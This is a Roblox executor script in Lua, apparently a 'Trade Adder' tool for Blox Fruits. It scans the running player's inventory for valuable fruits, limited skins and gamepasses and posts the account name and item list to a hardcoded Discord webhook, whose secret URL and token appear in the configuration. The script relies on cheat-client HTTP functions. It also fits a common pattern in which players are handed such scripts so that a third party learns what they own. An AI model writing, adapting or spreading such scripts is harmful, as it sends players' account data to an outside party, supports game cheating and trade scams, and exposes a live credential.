-- =========================================================
-- BLOX FRUITS INVENTORY WEBHOOK SENDER
-- Categorizes Permanent Fruits, Physical Fruits, and Skins
-- =========================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local ItemReplicationService = require(
    ReplicatedStorage:WaitForChild("ItemReplicationService")
)

local KEYS = require(
    ReplicatedStorage.ItemReplicationService:WaitForChild("KEYS")
)

local ItemConfig = require(
    ReplicatedStorage:WaitForChild("ItemConfig")
)

-- =========================================================
-- 1. CONFIGURATION
-- =========================================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1573609152549224509/TgrDN2kKASX7-U6mNDfxTZPpzGMXgG5NpzBjH9lGeS3-MDjFmp2aOS6vgUOCKDSBb_WK"

-- =========================================================
-- 2. ID LOOKUP TABLES (From Version 4)
-- =========================================================

local TradablePhysicalIds = {
    ["quake"] = 1389, ["rocket"] = 1390, ["magma"] = 1391, ["ice"] = 1392,
    ["buddha"] = 1393, ["flame"] = 1394, ["dark"] = 1395, ["rubber"] = 1396,
    ["bomb"] = 1397, ["spike"] = 1398, ["blade"] = 1399, ["smoke"] = 1400,
    ["phoenix"] = 1401, ["spring"] = 1402, ["spider"] = 1403, ["sand"] = 1404,
    ["gravity"] = 1405, ["pain"] = 1406, ["light"] = 1407, ["love"] = 1408,
    ["control"] = 1409, ["venom"] = 1410, ["spin"] = 1411, ["ghost"] = 1412,
    ["shadow"] = 1413, ["portal"] = 1414, ["spirit"] = 1415, ["blizzard"] = 1416,
    ["dough"] = 1417, ["mammoth"] = 1418, ["sound"] = 1419, ["t-rex"] = 1420,
    ["diamond"] = 1421, ["gas"] = 1422, ["kitsune"] = 1423, ["yeti"] = 1424,
    ["eagle"] = 1425, ["creation"] = 1426, ["lightning"] = 1427, ["celestial"] = 1428,
    ["oni"] = 1429, ["tiger"] = 1430, ["meme"] = 1431, ["werewolf"] = 1432,
    ["empyrean"] = 1433, ["fiend"] = 1434, ["dragon west"] = 1435, ["dragon east"] = 1436,
    ["dragon"] = 1447, ["magnet"] = 1515, ["hellfire gas"] = 1601
}

local TradablePermIds = {
    ["ghost"] = 341, ["love"] = 342, ["yeti"] = 343, ["bomb"] = 344,
    ["light"] = 345, ["sound"] = 346, ["flame"] = 347, ["venom"] = 348,
    ["magma"] = 349, ["blade"] = 350, ["diamond"] = 351, ["blizzard"] = 352,
    ["sand"] = 353, ["mammoth"] = 354, ["dragon east"] = 355, ["dragon west"] = 356,
    ["rocket"] = 357, ["control"] = 358, ["ice"] = 359, ["spin"] = 360,
    ["pain"] = 361, ["lightning"] = 362, ["gas"] = 363, ["tiger"] = 364,
    ["gravity"] = 365, ["quake"] = 366, ["shadow"] = 367, ["portal"] = 368,
    ["rubber"] = 369, ["phoenix"] = 370, ["dark"] = 371, ["buddha"] = 372,
    ["dough"] = 373, ["kitsune"] = 374, ["t-rex"] = 375, ["creation"] = 376,
    ["eagle"] = 377, ["spike"] = 378, ["smoke"] = 379, ["spider"] = 380,
    ["spring"] = 381, ["dragon"] = 382, ["spirit"] = 383, ["celestial"] = 605,
    ["oni"] = 606, ["magnet"] = 1517
}

local SpecialTargets = {
    "ember dragon (west)", "galaxy empyrean kitsune", "kyukonskincrimson",
    "divine portal", "pink portal", "orange portal", "runic fiend",
    "starlight gravity", "arcsteel magnet", "scarlet ghost",
    "purple lightning", "yellow lightning", "red lightning", "green lightning",
    "nuclear bomb", "thermite bomb", "azura bomb", "celebration bomb",
    "emerald diamond", "ruby diamond", "topaz diamond", "rose quartz diamond",
    "super spirit pain", "celestial pain", "torment pain", "sadness pain", "frustration pain",
    "requiem eagle", "glacier eagle", "matrix eagle", "falcskinparrot",
    "dog blade", "lime blade", "rabid",
    "doghouse (frame break)", "vibes (frame break)",
    "+1 fruit storage", "dark blade", "fruit notifier", "fast boats",
    "2x mastery", "2x money", "2x boss drops", "legendary scroll", "mythical scroll"
}

-- Build reverse ID lookup sets for fast classification
local PermIdLookup = {}
for _, id in pairs(TradablePermIds) do PermIdLookup[id] = true end

local PhysIdLookup = {}
for _, id in pairs(TradablePhysicalIds) do PhysIdLookup[id] = true end

-- =========================================================
-- 3. INVENTORY SCANNER & CATEGORIZER
-- =========================================================

local function getItemDisplayName(itemId)
    local ok, cfg = pcall(function()
        return ItemConfig.tryGet(itemId)
    end)

    if ok and type(cfg) == "table" then
        local display = cfg.Display and cfg.Display.Name
        local storage = cfg.Index and cfg.Index.StorageKey
        if display and display ~= "" then
            return tostring(display), tostring(storage or ""):lower()
        elseif storage and storage ~= "" then
            return tostring(storage), tostring(storage):lower()
        end
    end

    return "Item #" .. tostring(itemId), ""
end

local function isSpecialSkinOrPass(displayName, storageKey)
    local dLower = displayName:lower()
    for _, target in ipairs(SpecialTargets) do
        if dLower == target or storageKey == target or dLower:find(target, 1, true) then
            return true
        end
    end
    return false
end

local function scanInventory()
    local ownedCounts = {}
    local buckets = { KEYS.IS_OWNED, KEYS.COUNT }

    for _, keyType in ipairs(buckets) do
        if keyType ~= nil then
            local ok, items = pcall(function()
                return ItemReplicationService:GetItems(keyType)
            end)

            if ok and type(items) == "table" then
                for _, item in pairs(items) do
                    if type(item) == "table" and item.ItemId then
                        local count = 0
                        if type(item.Count) == "number" and item.Count > 0 then
                            count = item.Count
                        elseif type(item.Value) == "number" and item.Value > 0 then
                            count = item.Value
                        elseif item.Value == true then
                            count = 1
                        end

                        if count > 0 then
                            local current = ownedCounts[item.ItemId] or 0
                            if count > current then
                                ownedCounts[item.ItemId] = count
                            end
                        end
                    end
                end
            end
        end
    end

    local permList = {}
    local physList = {}
    local skinPassList = {}

    for id, count in pairs(ownedCounts) do
        local displayName, storageKey = getItemDisplayName(id)
        local countSuffix = (count > 1) and (" `x" .. tostring(count) .. "`") or ""

        if PermIdLookup[id] then
            table.insert(permList, "• **" .. displayName .. "**" .. countSuffix)
        elseif PhysIdLookup[id] or (type(id) == "number" and (id >= 1389 or id == 254)) then
            table.insert(physList, "• **" .. displayName .. "**" .. countSuffix)
        elseif isSpecialSkinOrPass(displayName, storageKey) then
            table.insert(skinPassList, "• **" .. displayName .. "**" .. countSuffix)
        end
    end

    table.sort(permList)
    table.sort(physList)
    table.sort(skinPassList)

    return permList, physList, skinPassList
end

-- =========================================================
-- 4. SAFE DISCORD EMBED BUILDER (Handles 1024-char limit)
-- =========================================================

local function addChunkedFields(fieldsTable, baseTitle, lines)
    if #lines == 0 then
        table.insert(fieldsTable, {
            name = baseTitle .. " (0)",
            value = "*None owned*",
            inline = false
        })
        return
    end

    local headerTitle = baseTitle .. " (" .. tostring(#lines) .. ")"
    local currentChunk = ""
    local partIndex = 1

    for _, line in ipairs(lines) do
        local nextText = (currentChunk == "") and line or (currentChunk .. "\n" .. line)
        if #nextText > 1000 then
            table.insert(fieldsTable, {
                name = (partIndex == 1) and headerTitle or (baseTitle .. " (Cont.)"),
                value = currentChunk,
                inline = false
            })
            currentChunk = line
            partIndex = partIndex + 1
        else
            currentChunk = nextText
        end
    end

    if currentChunk ~= "" then
        table.insert(fieldsTable, {
            name = (partIndex == 1) and headerTitle or (baseTitle .. " (Cont.)"),
            value = currentChunk,
            inline = false
        })
    end
end

-- =========================================================
-- 5. SEND WEBHOOK
-- =========================================================

local function sendInventoryWebhook()
    local permList, physList, skinPassList = scanInventory()

    local fields = {}
    addChunkedFields(fields, "💎 Permanent Fruits", permList)
    addChunkedFields(fields, "🍎 Physical Fruits", physList)
    addChunkedFields(fields, "✨ Limited Skins & Gamepasses", skinPassList)

    local payload = {
        username = "Blox Fruits Trade Scanner",
        embeds = {
            {
                title = "📦 Tradable Inventory Report",
                description = "**Account:** `" .. LocalPlayer.Name .. "`\n**Ready for `!add` commands**",
                color = 3447003, -- Clean Discord Blue
                fields = fields,
                footer = {
                    text = "Trade Adder V4 • Total Categories: "
                        .. tostring(#permList) .. " Perms | "
                        .. tostring(#physList) .. " Physical | "
                        .. tostring(#skinPassList) .. " Skins/Passes"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    local jsonBody = HttpService:JSONEncode(payload)

    -- Support all common executor HTTP request functions
    local requestFunc =
        (syn and syn.request)
        or (http and http.request)
        or http_request
        or request

    if not requestFunc then
        warn("[Webhook] Your executor does not support HTTP requests.")
        return
    end

    local ok, response = pcall(function()
        return requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonBody
        })
    end)

    if ok and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("[Webhook] Successfully sent tradable inventory to Discord!")
    else
        warn("[Webhook] Failed to send:", response and response.StatusCode or response)
    end
end

sendInventoryWebhook()
